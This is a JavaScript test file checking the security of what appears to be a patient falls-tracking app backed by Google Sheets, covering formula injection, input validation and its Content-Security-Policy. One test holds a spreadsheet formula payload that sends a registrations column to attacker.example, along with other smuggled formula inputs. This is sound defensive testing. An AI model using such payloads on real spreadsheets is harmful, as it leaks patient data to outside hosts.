var fs = require('fs');
var path = require('path');
var vm = require('vm');
var core = require(path.join(__dirname, '..', 'app-core.js'));
var helpers = require('./helpers');

var root = path.join(__dirname, '..');
var page = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
var ui = fs.readFileSync(path.join(root, 'app-ui.js'), 'utf8');
var gs = fs.readFileSync(path.join(root, 'apps-script', 'Code.gs'), 'utf8');
var TOKEN = gs.match(/SHARED_TOKEN = '([^']+)'/)[1];

/**
 * A small stand-in for Google Sheets, faithful in the one way that matters
 * here: text written to a cell that starts with = + - or @ becomes a formula,
 * and a leading apostrophe keeps it as text (and is not read back).
 */
function fakeSheets() {
  var sheets = {};
  function store(v) {
    if (typeof v === 'string' && v.charAt(0) === "'") return { text: v.slice(1) };
    if (typeof v === 'string' && /^[=+\-@]/.test(v)) return { formula: v };
    return { value: v };
  }
  function read(cell) {
    if (!cell) return '';
    if (cell.formula) return '#FORMULA';
    return cell.text !== undefined ? cell.text : cell.value;
  }
  function makeSheet(name) {
    var rows = [];
    return {
      rows: rows,
      getName: function () { return name; },
      appendRow: function (r) { rows.push(r.map(store)); },
      setFrozenRows: function () {},
      getLastRow: function () { return rows.length; },
      getDataRange: function () { return { getValues: function () { return rows.map(function (r) { return r.map(read); }); } }; },
      getRange: function (row) {
        return { setValues: function (vals) { rows[row - 1] = vals[0].map(store); } };
      }
    };
  }
  var ss = {
    getSheetByName: function (n) { return sheets[n] || null; },
    insertSheet: function (n) { sheets[n] = makeSheet(n); return sheets[n]; },
    getSheets: function () { return Object.keys(sheets).map(function (k) { return sheets[k]; }); }
  };
  return { ss: ss, sheets: sheets };
}

function backend() {
  var fake = fakeSheets();
  var ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: function () { return fake.ss; } },
    LockService: { getScriptLock: function () { return { tryLock: function () { return true; }, releaseLock: function () {} }; } },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: function (s) { return { body: s, setMimeType: function () { return this; } }; }
    },
    Utilities: { formatDate: function (d) { return d.toISOString().slice(0, 10); } },
    Session: { getScriptTimeZone: function () { return 'Asia/Bangkok'; } }
  };
  vm.createContext(ctx);
  vm.runInContext(gs, ctx);
  return {
    sheets: fake.sheets,
    post: function (payload) {
      var body = typeof payload === 'string' ? payload : JSON.stringify(payload);
      return JSON.parse(ctx.doPost({ postData: { contents: body } }).body);
    }
  };
}

function reg(extra) {
  return Object.assign({ token: TOKEN, schemaVersion: 1, patientId: '4405123', hn: '4405123', yearOfBirth: 1952, age: 74, sex: 'female', consent: true }, extra);
}

function formulaCells(b) {
  var found = [];
  Object.keys(b.sheets).forEach(function (name) {
    b.sheets[name].rows.forEach(function (r, i) {
      r.forEach(function (cell) { if (cell.formula) found.push(name + ' row ' + (i + 1) + ': ' + cell.formula); });
    });
  });
  return found;
}

function run() {
  var cases = [];

  cases.push({
    name: 'text that would be a formula is stored as text, never run',
    fn: function () {
      var b = backend();
      helpers.assert(b.post(reg()).ok, 'registration refused');
      var attack = '=IMAGE("https://attacker.example/?"&JOIN(",",Registrations!B:B))';
      ['=1+1', '+SUM(A1)', '-2+3', '@A1', attack, '\t=1'].forEach(function (cause, i) {
        var r = b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-0' + (i + 1), type: 'falls', injured: 0, cause: cause });
        helpers.assert(r.ok, 'fall ' + i + ' refused: ' + r.error);
      });
      helpers.assertEqual(formulaCells(b).join(' | '), '', 'a formula reached the sheet');
      var causes = b.sheets.Falls.rows.slice(1).map(function (r) { return r[3].text; });
      helpers.assert(causes.indexOf(attack) !== -1, 'the text itself should still be kept, as text');
    }
  });

  cases.push({
    name: 'a merged day re-writes kept cells safely too',
    fn: function () {
      var b = backend();
      b.post(reg());
      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'checkin', heightCm: 158 });
      // The stored text reads back without its apostrophe; writing it back raw would make a formula.
      b.sheets.CheckIns.rows[1][2] = { text: '=HYPERLINK("x")' };
      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'checkin', tugSeconds: 11 });
      helpers.assertEqual(formulaCells(b).join(' | '), '', 'the merge turned stored text into a formula');
    }
  });

  cases.push({
    name: 'a registration is never overwritten by a different one',
    fn: function () {
      var b = backend();
      helpers.assertEqual(b.post(reg()).result.action, 'inserted', 'first registration');
      helpers.assertEqual(b.post(reg()).result.action, 'duplicate_skipped', 'identical repeat');
      helpers.assertEqual(b.post(reg({ sex: 'male', yearOfBirth: 1990 })).result.action, 'inserted', 'changed registration');
      var rows = b.sheets.Registrations.rows;
      helpers.assertEqual(rows.length, 3, 'header + two registrations');
      helpers.assertEqual(rows[1][4].value, 'female', 'the first registration must be untouched');
    }
  });

  cases.push({
    name: 'bad requests are refused before anything is written',
    fn: function () {
      var b = backend();
      [
        [reg({ token: 'wrong' }), 'token'],
        [reg({ patientId: '=1+1', hn: '=1+1' }), 'patientId'],
        [reg({ patientId: 'a b' }), 'patientId'],
        [reg({ patientId: '123456789012345678901' }), 'patientId'],
        [{ token: TOKEN, patientId: '4405123', date: '=NOW()', type: 'falls' }, 'date'],
        [{ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'Registrations' }, 'type'],
        [{ token: TOKEN, patientId: { a: 1 }, date: '2026-09-01', type: 'falls' }, 'patientId']
      ].forEach(function (pair) {
        var r = b.post(pair[0]);
        helpers.assert(!r.ok && r.error.indexOf(pair[1]) !== -1, 'expected a refusal about ' + pair[1] + ', got ' + JSON.stringify(r));
      });
      helpers.assert(!b.post('{"token":"' + TOKEN + '","x":"' + new Array(30000).join('a') + '"}').ok, 'an oversized body must be refused');
      helpers.assertEqual(Object.keys(b.sheets).length, 0, 'nothing should have been written');
    }
  });

  cases.push({
    name: 'free text is capped and objects are dropped',
    fn: function () {
      var b = backend();
      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-01', type: 'falls', injured: 0, cause: new Array(1000).join('x') });
      b.post({ token: TOKEN, patientId: '4405123', date: '2026-09-02', type: 'falls', injured: { evil: true }, cause: ['a'] });
      var rows = b.sheets.Falls.rows;
      helpers.assert(rows[1][3].value.length <= 200, 'cause was not capped');
      helpers.assertEqual(rows[2][2].value, '', 'an object reached a cell');
    }
  });

  cases.push({
    name: 'the app refuses an HN that could start a formula',
    fn: function () {
      ['4405123', '12-3456', 'AB/123'].forEach(function (hn) { helpers.assert(core.isValidHn(hn), hn + ' should be accepted'); });
      ['=1+1', '-5', '+5', '@x', '1 2', '', '123456789012345678901'].forEach(function (hn) {
        helpers.assert(!core.isValidHn(hn), JSON.stringify(hn) + ' should be refused');
      });
      helpers.assert(/C\.isValidHn\(hn\)/.test(ui), 'registration does not check the HN');
      helpers.assert(/id="hnInput"[^>]*maxlength="20"/.test(ui), 'the HN field has no length cap');
      helpers.assert(/id="fallCause"[^>]*maxlength="200"/.test(ui) && /id="checkinFallCause"[^>]*maxlength="200"/.test(ui), 'fall cause fields have no length cap');
    }
  });

  cases.push({
    name: 'the page runs only its own scripts',
    fn: function () {
      var csp = (page.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/) || [])[1];
      helpers.assert(csp, 'no Content-Security-Policy');
      var scriptSrc = (csp.match(/script-src ([^;]+)/) || [])[1] || '';
      helpers.assertEqual(scriptSrc.trim(), "'self'", 'script-src must be self only');
      ["object-src 'none'", "base-uri 'none'", 'connect-src', 'https://script.google.com', 'https://script.googleusercontent.com'].forEach(function (d) {
        helpers.assert(csp.indexOf(d) !== -1, 'CSP is missing ' + d);
      });
      helpers.assert(!/<script>[\s\S]*?\S[\s\S]*?<\/script>/.test(page), 'index.html has an inline script, which the CSP would block');
      helpers.assert(!/\son[a-z]+="/.test(page) && !/\son[a-z]+=\\?"/.test(ui), 'an inline event handler would be blocked by the CSP');
      helpers.assert(/'\.\/app-ui\.js'/.test(fs.readFileSync(path.join(root, 'sw.js'), 'utf8')), 'the service worker does not cache app-ui.js');
    }
  });

  cases.push({
    name: 'numbers drawn into charts are escaped like everything else',
    fn: function () {
      helpers.assert(/esc\(p\.value\)/.test(ui), 'chart value labels are written without esc()');
    }
  });

  return helpers.runSuite('t19_security', cases);
}

module.exports = run;

if (require.main === module) {
  helpers.report(run());
}
